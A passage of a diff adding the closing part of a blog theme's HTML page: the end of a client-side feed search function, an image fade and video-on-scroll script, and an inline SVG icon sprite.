+            var title = entry.getElementsByTagName('title')[0].textContent
+            var link = entry.getElementsByTagName('link')[0].getAttribute('href')
+            var contentWithTags = entry.getElementsByTagName('content')[0].textContent
+            var content = contentWithTags.trim().replace(/<[^>]+>/g, '')
+            var rawContent = content.toLowerCase()
+
+            var LENGTH = 80
+            var finalContent = ''
+            var contentLength = rawContent.length
+            var searchResultIdx = rawContent.indexOf(key)
+
+            var startIdx = searchResultIdx - 20,
+                endIdx = startIdx + LENGTH
+
+            if (startIdx < 0) {
+                startIdx = 0
+                endIdx = 100
+            }
+
+            endIdx > contentLength && (endIdx = contentLength)
+
+            finalContent = content.substring(startIdx, endIdx)
+
+            if (title.toLowerCase().indexOf(key) > -1) {
+                searchResults.unshift({
+                    link: link,
+                    title: title,
+                    content: finalContent,
+                })
+            } else if (searchResultIdx > -1) {
+                searchResults.push({
+                    link: link,
+                    title: title,
+                    content: finalContent,
+                })
+            }
+        }
+    })
+    return searchResults
+}
+</script><script>$claudia.fadeInImage(null, $claudia.blurBackdropImg)
+
+window.addEventListener('resize', $claudia.throttle(function () {
+  var images = document.querySelectorAll('.js-img-fadeIn')
+  images.forEach($claudia.blurBackdropImg)
+}, 150))
+
+var timeout
+
+function videoScroll () {
+  if (timeout) {
+    clearTimeout(timeout)
+  }
+  timeout = setTimeout(function () {
+    var hasHover = false
+    document.querySelectorAll('.tlo-header').forEach(function (header) {
+      if (!hasHover && header.getBoundingClientRect().top + header.clientHeight < window.innerHeight && header.getBoundingClientRect().top > 58) {
+        header.classList.add('hover')
+        hasHover = true
+
+        var video = header.querySelector('stream')
+        if (video) {
+          if (!video['data-playing']) {
+            video.parentNode.classList.add('skeleton-with-content')
+          }
+          if (!video['data-loaded']) {
+            video['data-loaded'] = true
+          }
+          try {
+            video.play()
+          } catch(_) {
+            video['data-playing'] = true
+            video.parentNode.classList.remove('skeleton-with-content')
+          }
+        }
+      } else {
+        header.classList.remove('hover')
+
+        var video = header.querySelector('stream')
+        if (video) {
+          video.parentNode.classList.remove('skeleton-with-content')
+          video.pause()
+          video['data-loaded'] = false
+        }
+      }
+    })
+  }, 100)
+}
+</script><svg aria-hidden="true" style="position: absolute; width: 0px; height: 0px; overflow: hidden;">
+  <symbol id="icon-location-fill" viewBox="0 0 1024 1024"><path d="M512 327c-29.9 0-58 11.6-79.2 32.8C411.7 381 400 409.1 400 439c0 29.9 11.7 58 32.8 79.2C454 539.3 482.1 551 512 551c29.9 0 58-11.7 79.2-32.8C612.4 497 624 468.9 624 439c0-29.9-11.6-58-32.8-79.2S541.9 327 512 327z"></path><path d="M854.6 289.1c-18.8-43.4-45.7-82.3-79.9-115.7-34.2-33.4-73.9-59.5-118.2-77.8C610.7 76.6 562.1 67 512 67c-50.1 0-98.7 9.6-144.5 28.5-44.3 18.3-84 44.5-118.2 77.8-34.2 33.4-61.1 72.4-79.9 115.7-19.5 45-29.4 92.8-29.4 142 0 70.6 16.9 140.9 50.1 208.7 26.7 54.5 64 107.6 111 158.1 80.3 86.2 164.5 138.9 188.4 153 6.9 4.1 14.7 6.1 22.4 6.1 7.8 0 15.5-2 22.4-6.1 23.9-14.1 108.1-66.8 188.4-153 47-50.4 84.3-103.6 111-158.1C867.1 572 884 501.8 884 431.1c0-49.2-9.9-97-29.4-142zM512 615c-97.2 0-176-78.8-176-176s78.8-176 176-176 176 78.8 176 176-78.8 176-176 176z"></path></symbol>
+  <symbol id="icon-search" viewBox="0 0 1024 1024"><path d="M909.6 854.5L649.9 594.8C690.2 542.7 712 479 712 412c0-80.2-31.3-155.4-87.9-212.1-56.6-56.7-132-87.9-212.1-87.9s-155.5 31.3-212.1 87.9C143.2 256.5 112 331.8 112 412c0 80.1 31.3 155.5 87.9 212.1C256.5 680.8 331.8 712 412 712c67 0 130.6-21.8 182.7-62l259.7 259.6c3.2 3.2 8.4 3.2 11.6 0l43.6-43.5c3.2-3.2 3.2-8.4 0-11.6zM570.4 570.4C528 612.7 471.8 636 412 636s-116-23.3-158.4-65.6C211.3 528 188 471.8 188 412s23.3-116.1 65.6-158.4C296 211.3 352.2 188 412 188s116.1 23.2 158.4 65.6S636 352.2 636 412s-23.3 116.1-65.6 158.4z"></path></symbol>
+  <symbol id="icon-feed" viewBox="0 0 1024 1024"><path d="M320.374394 768q0 45.714286-32 77.714286t-77.714285 32-77.714286-32-32-77.714286 32-77.714286 77.714286-32 77.714285 32 32 77.714286z m292.571429 70.285714q1.142857 16-9.714286 27.428572-10.285714 12-26.857143 12H499.231537q-14.285714 0-24.571428-9.428572t-11.428572-23.714285q-12.571429-130.857143-105.428571-223.714286T134.08868 515.428571q-14.285714-1.142857-23.714286-11.428571T100.945823 479.428571V402.285714q0-16.571429 12-26.857143 9.714286-9.714286 24.571428-9.714285h2.857143q91.428571 7.428571 174.857143 46T463.231537 515.428571q65.142857 64.571429 103.714286 148t46 174.857143z m292.571428 1.142857q1.142857 15.428571-10.285714 26.857143-10.285714 11.428571-26.285714 11.428572h-81.714286q-14.857143 0-25.428571-10T750.660109 843.428571q-6.857143-122.857143-57.714286-233.428571t-132.285714-192-192-132.285714T135.231537 227.428571q-14.285714-0.571429-24.285714-11.142857T100.945823 191.428571V109.714286q0-16 11.428571-26.285715 10.285714-10.285714 25.142857-10.285714h1.714286q149.714286 7.428571 286.571429 68.571429T668.945823 309.714286q106.857143 106.285714 168 243.142857t68.571428 286.571428z"></path></symbol>
+  <symbol id="icon-right" viewBox="0 0 1024 1024"><path d="M765.7 486.8L314.9 134.7c-5.3-4.1-12.9-0.4-12.9 6.3v77.3c0 4.9 2.3 9.6 6.1 12.6l360 281.1-360 281.1c-3.9 3-6.1 7.7-6.1 12.6V883c0 6.7 7.7 10.4 12.9 6.3l450.8-352.1c16.4-12.8 16.4-37.6 0-50.4z"></path></symbol>
+  <symbol id="icon-left" viewBox="0 0 1024 1024"><path d="M724 218.3V141c0-6.7-7.7-10.4-12.9-6.3L260.3 486.8c-16.4 12.8-16.4 37.5 0 50.3l450.8 352.1c5.3 4.1 12.9 0.4 12.9-6.3v-77.3c0-4.9-2.3-9.6-6.1-12.6l-360-281 360-281.1c3.8-3 6.1-7.7 6.1-12.6z"></path></symbol>
+  <symbol id="icon-mail-fill" viewBox="0 0 1024 1024"><path d="M928 160H96c-17.7 0-32 14.3-32 32v640c0 17.7 14.3 32 32 32h832c17.7 0 32-14.3 32-32V192c0-17.7-14.3-32-32-32z m-80.8 108.9L531.7 514.4c-7.8 6.1-18.7 6.1-26.5 0L189.6 268.9c-1.8-1.4-2.8-3.5-2.8-5.7 0-4 3.2-7.2 7.2-7.2h648.8c2.2 0 4.3 1 5.7 2.8 2.4 3.1 1.9 7.6-1.3 10.1z"></path></symbol>
+  <symbol id="icon-github-fill" viewBox="0 0 1024 1024"><path d="M511.6 76.3C264.3 76.2 64 276.4 64 523.5 64 718.9 189.3 885 363.8 946c23.5 5.9 19.9-10.8 19.9-22.2v-77.5c-135.7 15.9-141.2-73.9-150.3-88.9C215 726 171.5 718 184.5 703c30.9-15.9 62.4 4 98.9 57.9 26.4 39.1 77.9 32.5 104 26 5.7-23.5 17.9-44.5 34.7-60.8-140.6-25.2-199.2-111-199.2-213 0-49.5 16.3-95 48.3-131.7-20.4-60.5 1.9-112.3 4.9-120 58.1-5.2 118.5 41.6 123.2 45.3 33-8.9 70.7-13.6 112.9-13.6 42.4 0 80.2 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.3-43.9 2.9 7.7 24.7 58.3 5.5 118 32.4 36.8 48.9 82.7 48.9 132.3 0 102.2-59 188.1-200 212.9 23.5 23.2 38.1 55.4 38.1 91v112.5c0.8 9 0 17.9 15 17.9 177.1-59.7 304.6-227 304.6-424.1 0-247.2-200.4-447.3-447.5-447.3z"></path></symbol>
+  <symbol id="icon-bluesky" viewBox="0 0 1024 1024"><path d="M512 485.888c-38.656-75.136-143.872-215.210667-241.706667-284.245333-93.738667-66.133333-129.450667-54.741333-152.874666-44.074667C90.282667 169.728 85.333333 211.413333 85.333333 235.861333c0 24.533333 13.44 200.917333 22.186667 230.4 29.013333 97.28 132.010667 130.133333 226.986667 119.594667-139.093333 20.608-262.698667 71.253333-100.693334 251.648 178.261333 184.533333 244.309333-39.552 278.186667-153.173333 33.877333 113.621333 72.874667 329.642667 274.944 153.173333 151.722667-153.173333 41.685333-231.04-97.408-251.648 94.933333 10.538667 197.973333-22.314667 226.944-119.594667 8.746667-29.44 22.186667-205.866667 22.186667-230.357333 0-24.533333-4.949333-66.133333-32.085334-78.421333-23.424-10.581333-59.136-22.058667-152.874666 44.074666-97.834667 69.162667-203.093333 209.237333-241.706667 284.330667z" p-id="2372"></path></symbol>
+  <symbol id="icon-telegram" viewBox="0 0 1024 1024"><path d="M512 938.666667C276.352 938.666667 85.333333 747.648 85.333333 512S276.352 85.333333 512 85.333333s426.666667 191.018667 426.666667 426.666667-191.018667 426.666667-426.666667 426.666667z m-132.693333-376.746667l0.554666-0.298667 37.12 122.453334c4.778667 13.269333 11.349333 15.658667 19.328 14.549333 8.021333-1.066667 12.245333-5.376 17.493334-10.410667l50.688-48.981333 108.8 80.554667c19.882667 10.965333 34.176 5.290667 39.125333-18.432l70.698667-333.738667c7.808-31.061333-5.845333-43.52-29.952-33.621333l-415.274667 160.426666c-28.330667 11.349333-28.16 27.221333-5.12 34.261334l106.538667 33.28z" p-id="5206"></path></symbol>
+</svg></body></html>
